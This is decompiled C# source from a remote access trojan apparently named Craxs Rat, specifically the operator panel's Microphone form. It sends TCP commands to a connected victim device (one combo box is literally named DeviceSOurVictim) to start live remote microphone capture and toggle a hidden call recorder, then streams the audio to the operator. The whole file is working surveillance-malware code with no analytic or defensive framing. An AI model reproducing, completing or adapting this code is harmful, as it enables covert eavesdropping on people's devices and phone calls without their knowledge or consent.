using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;
using WinMM;

namespace Craxs_Rat
{
	// Token: 0x020000DD RID: 221
	[DesignerGenerated]
	public partial class Microphone : Form
	{
		// Token: 0x060010B2 RID: 4274 RVA: 0x000AFC24 File Offset: 0x000ADE24
		public Microphone()
		{
			base.Load += this.Microphone_Load;
			base.Closing += this.Microphone_Closing;
			base.FormClosing += this.Microphone_FormClosing;
			this.waveOut_0 = null;
			this.string_0 = "null";
			this.bytes_0 = new List<byte[]>();
			this.object_0 = false;
			this.InitializeComponent();
			this.Font = Module8.font_1;
		}

		// Token: 0x170004F4 RID: 1268
		// (get) Token: 0x060010B5 RID: 4277 RVA: 0x000070E4 File Offset: 0x000052E4
		// (set) Token: 0x060010B6 RID: 4278 RVA: 0x000B0E24 File Offset: 0x000AF024
		internal virtual Button bIN
		{
			[CompilerGenerated]
			get
			{
				return this._bIN;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.bIN_Click);
				Button bIN = this._bIN;
				if (bIN != null)
				{
					bIN.Click -= value2;
				}
				this._bIN = value;
				bIN = this._bIN;
				if (bIN != null)
				{
					bIN.Click += value2;
				}
			}
		}

		// Token: 0x170004F5 RID: 1269
		// (get) Token: 0x060010B7 RID: 4279 RVA: 0x000070EC File Offset: 0x000052EC
		// (set) Token: 0x060010B8 RID: 4280 RVA: 0x000B0E68 File Offset: 0x000AF068
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x170004F6 RID: 1270
		// (get) Token: 0x060010B9 RID: 4281 RVA: 0x000070F4 File Offset: 0x000052F4
		// (set) Token: 0x060010BA RID: 4282 RVA: 0x000B0E7C File Offset: 0x000AF07C
		internal virtual Label Label2 { get; set; }

		// Token: 0x170004F7 RID: 1271
		// (get) Token: 0x060010BB RID: 4283 RVA: 0x000070FC File Offset: 0x000052FC
		// (set) Token: 0x060010BC RID: 4284 RVA: 0x000B0E90 File Offset: 0x000AF090
		internal virtual ComboBox OutHZ { get; set; }

		// Token: 0x170004F8 RID: 1272
		// (get) Token: 0x060010BD RID: 4285 RVA: 0x00007104 File Offset: 0x00005304
		// (set) Token: 0x060010BE RID: 4286 RVA: 0x000B0EA4 File Offset: 0x000AF0A4
		internal virtual Label Label1 { get; set; }

		// Token: 0x170004F9 RID: 1273
		// (get) Token: 0x060010BF RID: 4287 RVA: 0x0000710C File Offset: 0x0000530C
		// (set) Token: 0x060010C0 RID: 4288 RVA: 0x000B0EB8 File Offset: 0x000AF0B8
		internal virtual ComboBox OutBoxSource
		{
			[CompilerGenerated]
			get
			{
				return this._OutBoxSource;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.OutBoxSource_SelectedIndexChanged);
				ComboBox outBoxSource = this._OutBoxSource;
				if (outBoxSource != null)
				{
					outBoxSource.SelectedIndexChanged -= value2;
				}
				this._OutBoxSource = value;
				outBoxSource = this._OutBoxSource;
				if (outBoxSource != null)
				{
					outBoxSource.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x170004FA RID: 1274
		// (get) Token: 0x060010C1 RID: 4289 RVA: 0x00007114 File Offset: 0x00005314
		// (set) Token: 0x060010C2 RID: 4290 RVA: 0x000B0EFC File Offset: 0x000AF0FC
		internal virtual Button b_sta
		{
			[CompilerGenerated]
			get
			{
				return this._b_sta;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.b_sta_Click);
				Button b_sta = this._b_sta;
				if (b_sta != null)
				{
					b_sta.Click -= value2;
				}
				this._b_sta = value;
				b_sta = this._b_sta;
				if (b_sta != null)
				{
					b_sta.Click += value2;
				}
			}
		}

		// Token: 0x170004FB RID: 1275
		// (get) Token: 0x060010C3 RID: 4291 RVA: 0x0000711C File Offset: 0x0000531C
		// (set) Token: 0x060010C4 RID: 4292 RVA: 0x000B0F40 File Offset: 0x000AF140
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x170004FC RID: 1276
		// (get) Token: 0x060010C5 RID: 4293 RVA: 0x00007124 File Offset: 0x00005324
		// (set) Token: 0x060010C6 RID: 4294 RVA: 0x000B0F54 File Offset: 0x000AF154
		internal virtual ComboBox DeviceSOurVictim { get; set; }

		// Token: 0x170004FD RID: 1277
		// (get) Token: 0x060010C7 RID: 4295 RVA: 0x0000712C File Offset: 0x0000532C
		// (set) Token: 0x060010C8 RID: 4296 RVA: 0x000B0F68 File Offset: 0x000AF168
		internal virtual Label Label3 { get; set; }

		// Token: 0x170004FE RID: 1278
		// (get) Token: 0x060010C9 RID: 4297 RVA: 0x00007134 File Offset: 0x00005334
		// (set) Token: 0x060010CA RID: 4298 RVA: 0x000B0F7C File Offset: 0x000AF17C
		internal virtual ComboBox inHZ { get; set; }

		// Token: 0x170004FF RID: 1279
		// (get) Token: 0x060010CB RID: 4299 RVA: 0x0000713C File Offset: 0x0000533C
		// (set) Token: 0x060010CC RID: 4300 RVA: 0x000B0F90 File Offset: 0x000AF190
		internal virtual ComboBox InBoxSource
		{
			[CompilerGenerated]
			get
			{
				return this._InBoxSource;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.InBoxSource_SelectedIndexChanged);
				ComboBox inBoxSource = this._InBoxSource;
				if (inBoxSource != null)
				{
					inBoxSource.SelectedIndexChanged -= value2;
				}
				this._InBoxSource = value;
				inBoxSource = this._InBoxSource;
				if (inBoxSource != null)
				{
					inBoxSource.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000508 RID: 1288
		// (get) Token: 0x060010CD RID: 4301 RVA: 0x00007144 File Offset: 0x00005344
		// (set) Token: 0x060010CE RID: 4302 RVA: 0x000B0FD4 File Offset: 0x000AF1D4
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x17000500 RID: 1280
		// (get) Token: 0x060010CF RID: 4303 RVA: 0x0000714C File Offset: 0x0000534C
		// (set) Token: 0x060010D0 RID: 4304 RVA: 0x000B1018 File Offset: 0x000AF218
		internal virtual Label LAB_ERR { get; set; }

		// Token: 0x17000501 RID: 1281
		// (get) Token: 0x060010D1 RID: 4305 RVA: 0x00007154 File Offset: 0x00005354
		// (set) Token: 0x060010D2 RID: 4306 RVA: 0x000B102C File Offset: 0x000AF22C
		internal virtual TabControl TabControl1 { get; set; }

		// Token: 0x17000502 RID: 1282
		// (get) Token: 0x060010D3 RID: 4307 RVA: 0x0000715C File Offset: 0x0000535C
		// (set) Token: 0x060010D4 RID: 4308 RVA: 0x000B1040 File Offset: 0x000AF240
		internal virtual TabPage TabPage1 { get; set; }

		// Token: 0x17000503 RID: 1283
		// (get) Token: 0x060010D5 RID: 4309 RVA: 0x00007164 File Offset: 0x00005364
		// (set) Token: 0x060010D6 RID: 4310 RVA: 0x000B1054 File Offset: 0x000AF254
		internal virtual TabPage TabPage2 { get; set; }

		// Token: 0x17000509 RID: 1289
		// (get) Token: 0x060010D7 RID: 4311 RVA: 0x0000716C File Offset: 0x0000536C
		// (set) Token: 0x060010D8 RID: 4312 RVA: 0x000B1068 File Offset: 0x000AF268
		internal virtual ImageList ImageList1 { get; set; }

		// Token: 0x17000504 RID: 1284
		// (get) Token: 0x060010D9 RID: 4313 RVA: 0x00007174 File Offset: 0x00005374
		// (set) Token: 0x060010DA RID: 4314 RVA: 0x000B107C File Offset: 0x000AF27C
		internal virtual Label Label5 { get; set; }

		// Token: 0x17000505 RID: 1285
		// (get) Token: 0x060010DB RID: 4315 RVA: 0x0000717C File Offset: 0x0000537C
		// (set) Token: 0x060010DC RID: 4316 RVA: 0x000B1090 File Offset: 0x000AF290
		internal virtual Label Label4 { get; set; }

		// Token: 0x17000506 RID: 1286
		// (get) Token: 0x060010DD RID: 4317 RVA: 0x00007184 File Offset: 0x00005384
		// (set) Token: 0x060010DE RID: 4318 RVA: 0x000B10A4 File Offset: 0x000AF2A4
		internal virtual DrakeUILampLED DrakeUILampLED1 { get; set; }

		// Token: 0x17000507 RID: 1287
		// (get) Token: 0x060010DF RID: 4319 RVA: 0x0000718C File Offset: 0x0000538C
		// (set) Token: 0x060010E0 RID: 4320 RVA: 0x000B10B8 File Offset: 0x000AF2B8
		internal virtual Button Button1
		{
			[CompilerGenerated]
			get
			{
				return this._Button1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				Button button = this._Button1;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button1 = value;
				button = this._Button1;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x1700050A RID: 1290
		// (get) Token: 0x060010E1 RID: 4321 RVA: 0x00007194 File Offset: 0x00005394
		// (set) Token: 0x060010E2 RID: 4322 RVA: 0x000B10FC File Offset: 0x000AF2FC
		public virtual BackgroundWorker Bgworker
		{
			[CompilerGenerated]
			get
			{
				return this._Bgworker;
			}
			[CompilerGenerated]
			set
			{
				DoWorkEventHandler value2 = new DoWorkEventHandler(this.Bgworker_DoWork);
				BackgroundWorker bgworker = this._Bgworker;
				if (bgworker != null)
				{
					bgworker.DoWork -= value2;
				}
				this._Bgworker = value;
				bgworker = this._Bgworker;
				if (bgworker != null)
				{
					bgworker.DoWork += value2;
				}
			}
		}

		// Token: 0x060010E3 RID: 4323 RVA: 0x000B1140 File Offset: 0x000AF340
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity == 1.0)
			{
				this.TOpacity.Enabled = false;
			}
			else
			{
				base.Opacity += 0.1;
			}
		}

		// Token: 0x060010E4 RID: 4324 RVA: 0x000B1188 File Offset: 0x000AF388
		private void Microphone_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\13.ico");
			this.method_9();
			this.Text = this.string_0;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x060010E5 RID: 4325 RVA: 0x000B11E0 File Offset: 0x000AF3E0
		public void method_2()
		{
			int num = 0;
			checked
			{
				if (this.Panel1.Visible)
				{
					num += this.Panel1.Height;
				}
				if (this.Panel2.Visible)
				{
					num += this.Panel2.Height;
				}
				int num2 = base.Height - base.ClientSize.Height - 1;
				if (!this.Panel1.Visible & !this.Panel2.Visible)
				{
					this.LAB_ERR.Visible = true;
					this.LAB_ERR.Text = "No Input and No Output Devices Found";
					num = this.LAB_ERR.Height;
				}
				base.Height = num + num2;
			}
		}

		// Token: 0x060010E6 RID: 4326 RVA: 0x000B1290 File Offset: 0x000AF490
		private void Microphone_Closing(object sender, CancelEventArgs e)
		{
			this.DrakeUILampLED1.Blink = false;
			this.DrakeUILampLED1.On = false;
			this.DrakeUILampLED1.Dispose();
			if (Operators.ConditionalCompareObjectEqual(this.object_0, false, false))
			{
				this.object_0 = false;
				if (this.gclass8_0 != null)
				{
					TcpClient tcpClient = this.gclass8_0.tcpClient_0;
					object[] objects_ = new object[]
					{
						tcpClient,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"srec<*>off",
							GClass9.string_0,
							"0",
							GClass9.string_0,
							"0",
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
			}
			if (this.waveOut_0 != null)
			{
				this.waveOut_0.Stop();
			}
			if (this.gclass8_1 != null)
			{
				this.gclass8_1.bool_2 = true;
				this.gclass8_1.method_6(this.tcpClient_1);
			}
			if (this.gclass8_2 != null)
			{
				this.gclass8_2.bool_2 = true;
				this.gclass8_2.method_6(this.tcpClient_2);
			}
			this.method_8();
		}

		// Token: 0x060010E7 RID: 4327 RVA: 0x000B1444 File Offset: 0x000AF644
		private void b_sta_Click(object sender, EventArgs e)
		{
			if (!Operators.ConditionalCompareObjectEqual(this.b_sta.Tag, 2, false))
			{
				if (Operators.ConditionalCompareObjectEqual(this.b_sta.Tag, 0, false))
				{
					this.b_sta.Tag = 1;
					this.b_sta.Text = "...";
					this.method_5();
				}
			}
			else
			{
				this.method_6();
				this.b_sta.Tag = 0;
				this.b_sta.Text = "Start Microphone";
			}
		}

		// Token: 0x060010E8 RID: 4328 RVA: 0x000B14D4 File Offset: 0x000AF6D4
		private void method_5()
		{
			if (this.gclass8_0 != null)
			{
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				int selectedIndex = this.OutBoxSource.SelectedIndex;
				if (this.gclass8_0.string_0.Split(new char[]
				{
					':'
				})[7][1] == '0')
				{
					object[] objects_ = new object[]
					{
						this.tcpClient_0,
						Module13.string_33 + GClass9.string_0,
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
				}
				object[] objects_2 = new object[]
				{
					this.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".microphone",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_40,
						GClass9.string_0,
						"start",
						GClass9.string_1,
						array[0],
						GClass9.string_1,
						array[1],
						GClass9.string_1,
						Conversions.ToString(Module8.smethod_22(this.OutHZ.Text)),
						GClass9.string_1,
						Module13.string_16,
						GClass9.string_1,
						this.gclass8_0.string_2,
						GClass9.string_1,
						"0"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_2);
			}
		}

		// Token: 0x060010E9 RID: 4329 RVA: 0x000B16A0 File Offset: 0x000AF8A0
		public void method_6()
		{
			if (this.gclass8_1 != null)
			{
				this.gclass8_1.bool_2 = true;
				this.gclass8_1.method_6(this.tcpClient_1);
			}
			if (this.waveOut_0 != null)
			{
				this.waveOut_0.Stop();
			}
			this.waveOut_0 = null;
		}

		// Token: 0x060010EA RID: 4330 RVA: 0x000B16F4 File Offset: 0x000AF8F4
		public bool method_7(int int_2)
		{
			this.WaveIn_0 = new WaveIn(int_2);
			this.WaveIn_0.Open(Module8.smethod_20(this.int_1));
			this.WaveIn_0.Start();
			this.Bgworker = new BackgroundWorker();
			if (!this.Bgworker.IsBusy)
			{
				this.bool_0 = true;
				this.Bgworker.RunWorkerAsync();
				if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 1, false))
				{
					this.bIN.Tag = 2;
					this.bIN.Text = "Ready";
				}
			}
			return true;
		}

		// Token: 0x060010EB RID: 4331 RVA: 0x000B1798 File Offset: 0x000AF998
		private void method_8()
		{
			this.bool_0 = false;
			if (this.Bgworker != null && this.Bgworker.IsBusy)
			{
				this.Bgworker.Dispose();
			}
			this.bytes_0.Clear();
			if (this.gclass8_2 != null)
			{
				this.gclass8_2.bool_2 = true;
				this.gclass8_2.method_6(this.tcpClient_2);
			}
			if (this.waveOut_0 != null)
			{
				this.waveOut_0.Stop();
			}
		}

		// Token: 0x060010EC RID: 4332 RVA: 0x000B181C File Offset: 0x000AFA1C
		private void method_9()
		{
			IEnumerator enumerator = null;
			try
			{
				foreach (object obj in WaveIn.Devices)
				{
					WaveInDeviceCaps waveInDeviceCaps = (WaveInDeviceCaps)obj;
					if (waveInDeviceCaps.DeviceId != -1)
					{
						waveInDeviceCaps.Name = waveInDeviceCaps.Name.Replace("(", "").Replace(")", "");
						string item = string.Format("({0})-{1}", waveInDeviceCaps.DeviceId, waveInDeviceCaps.Name);
						this.InBoxSource.Items.Add(item);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					((IDisposable)enumerator).Dispose();
				}
			}
			if (this.InBoxSource.Items.Count != 0)
			{
				this.InBoxSource.SelectedIndex = 0;
				this.DeviceSOurVictim.SelectedIndex = 0;
				this.inHZ.SelectedIndex = 0;
			}
			else
			{
				this.Panel2.Visible = false;
			}
		}

		// Token: 0x060010ED RID: 4333 RVA: 0x000B1928 File Offset: 0x000AFB28
		private void method_10(string string_0, ref byte[] bytes_1)
		{
			FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(bytes_1, 0, bytes_1.Length);
			fileStream.Close();
		}

		// Token: 0x060010EE RID: 4334 RVA: 0x000B1954 File Offset: 0x000AFB54
		private void WaveIn_0_DataReady(object sender, DataReadyEventArgs e)
		{
			this.bytes_0.Add(e.Data);
		}

		// Token: 0x060010EF RID: 4335 RVA: 0x000B1974 File Offset: 0x000AFB74
		private void bIN_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 0, false))
				{
					this.method_8();
					this.bytes_0.Clear();
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					int selectedIndex = this.DeviceSOurVictim.SelectedIndex;
					object[] objects_ = new object[]
					{
						this.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_28,
							GClass9.string_0,
							Module8.string_4,
							".microphone",
							GClass9.string_0,
							"method",
							GClass9.string_0,
							Module13.string_40,
							GClass9.string_0,
							"input",
							GClass9.string_1,
							array[0],
							GClass9.string_1,
							array[1],
							GClass9.string_1,
							this.gclass8_0.string_2,
							GClass9.string_1,
							Module13.string_21,
							GClass9.string_1,
							selectedIndex.ToString(),
							GClass9.string_1,
							Conversions.ToString(Module8.smethod_22(this.inHZ.Text))
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
					this.bIN.Tag = 1;
					this.bIN.Text = "Cancel...";
				}
				else if (!Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 1, false))
				{
					if (Operators.ConditionalCompareObjectEqual(this.bIN.Tag, 2, false))
					{
						this.method_8();
						this.bIN.Text = "Run";
						this.bIN.Tag = 0;
					}
				}
				else
				{
					this.method_8();
					this.bIN.Text = "Run";
					this.bIN.Tag = 0;
				}
			}
		}

		// Token: 0x060010F0 RID: 4336 RVA: 0x000B1BA4 File Offset: 0x000AFDA4
		private void Bgworker_DoWork(object sender, DoWorkEventArgs e)
		{
			checked
			{
				do
				{
					if (this.bytes_0.Count > 0)
					{
						byte[] array = this.bytes_0[0];
						try
						{
							if (this.tcpClient_2.Client.Connected)
							{
								this.tcpClient_2.Client.Poll(Module3.int_1, SelectMode.SelectWrite);
								this.tcpClient_2.Client.SendBufferSize = array.Length * 15;
								this.tcpClient_2.GetStream().Write(array, 0, array.Length);
								GClass7 gclass7_ = this.gclass8_0.gclass7_0;
								ref long ptr = ref gclass7_.long_0;
								gclass7_.long_0 = ptr + unchecked((long)array.Length);
							}
						}
						catch (Exception ex)
						{
							break;
						}
						if (this.bool_0 > false)
						{
							this.bytes_0.RemoveAt(0);
						}
					}
					Thread.Sleep(1);
				}
				while (this.bool_0);
			}
		}

		// Token: 0x1700050B RID: 1291
		// (get) Token: 0x060010F1 RID: 4337 RVA: 0x000B1C90 File Offset: 0x000AFE90
		// (set) Token: 0x060010F2 RID: 4338 RVA: 0x000B1CA8 File Offset: 0x000AFEA8
		public virtual WaveIn WaveIn_0
		{
			get
			{
				return this._WaveIn_0;
			}
			set
			{
				EventHandler<DataReadyEventArgs> value2 = new EventHandler<DataReadyEventArgs>(this.WaveIn_0_DataReady);
				if (this._WaveIn_0 != null)
				{
					this._WaveIn_0.DataReady -= value2;
				}
				this._WaveIn_0 = value;
				if (this._WaveIn_0 != null)
				{
					this._WaveIn_0.DataReady += value2;
				}
			}
		}

		// Token: 0x060010F3 RID: 4339 RVA: 0x000B1CF8 File Offset: 0x000AFEF8
		private void InBoxSource_SelectedIndexChanged(object sender, EventArgs e)
		{
			string value = Regex.Match(this.InBoxSource.SelectedItem.ToString(), string.Concat(new string[]
			{
				"(?<=",
				Regex.Escape("("),
				").+?(?=",
				Regex.Escape(")"),
				")"
			}), RegexOptions.IgnoreCase).Value;
			this.int_0 = Conversions.ToInteger(value.Trim());
		}

		// Token: 0x060010F4 RID: 4340 RVA: 0x0000246D File Offset: 0x0000066D
		private void OutBoxSource_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060010F5 RID: 4341 RVA: 0x0000246D File Offset: 0x0000066D
		private void Microphone_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		// Token: 0x060010F6 RID: 4342 RVA: 0x000B1D70 File Offset: 0x000AFF70
		private void Button1_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.Button1.Tag.ToString(), "o", false) != 0)
			{
				if (this.gclass8_0 != null)
				{
					this.Button1.Tag = "o";
					TcpClient tcpClient = this.gclass8_0.tcpClient_0;
					object[] objects_ = new object[]
					{
						tcpClient,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"srec<*>off",
							GClass9.string_0,
							"0",
							GClass9.string_0,
							"0",
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_);
					this.Button1.Text = "Start Recorder";
					this.object_0 = false;
					this.DrakeUILampLED1.On = false;
					this.DrakeUILampLED1.Blink = false;
				}
			}
			else if (this.gclass8_0 != null)
			{
				this.Button1.Tag = "f";
				TcpClient tcpClient2 = this.gclass8_0.tcpClient_0;
				object[] objects_2 = new object[]
				{
					tcpClient2,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"srec<*>on",
						GClass9.string_0,
						"0",
						GClass9.string_0,
						"0",
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_2);
				this.object_0 = true;
				this.DrakeUILampLED1.On = true;
				this.DrakeUILampLED1.Blink = true;
				this.Button1.Text = "Stop Recorder";
				Alert.ShowSucess("Use Call Recorder\r\nto get records");
			}
		}

		// Token: 0x0400092C RID: 2348
		public GClass8 gclass8_0;

		// Token: 0x0400092D RID: 2349
		public TcpClient tcpClient_0;

		// Token: 0x0400092E RID: 2350
		public TcpClient tcpClient_1;

		// Token: 0x0400092F RID: 2351
		public GClass8 gclass8_1;

		// Token: 0x04000930 RID: 2352
		public WaveOut waveOut_0;

		// Token: 0x04000931 RID: 2353
		private WaveIn _WaveIn_0;

		// Token: 0x04000932 RID: 2354
		public string string_0;

		// Token: 0x04000933 RID: 2355
		public List<byte[]> bytes_0;

		// Token: 0x04000935 RID: 2357
		public TcpClient tcpClient_2;

		// Token: 0x04000936 RID: 2358
		public GClass8 gclass8_2;

		// Token: 0x04000937 RID: 2359
		private bool bool_0;

		// Token: 0x04000938 RID: 2360
		public int int_0;

		// Token: 0x04000939 RID: 2361
		public int int_1;

		// Token: 0x0400093A RID: 2362
		public object object_0;
	}
}
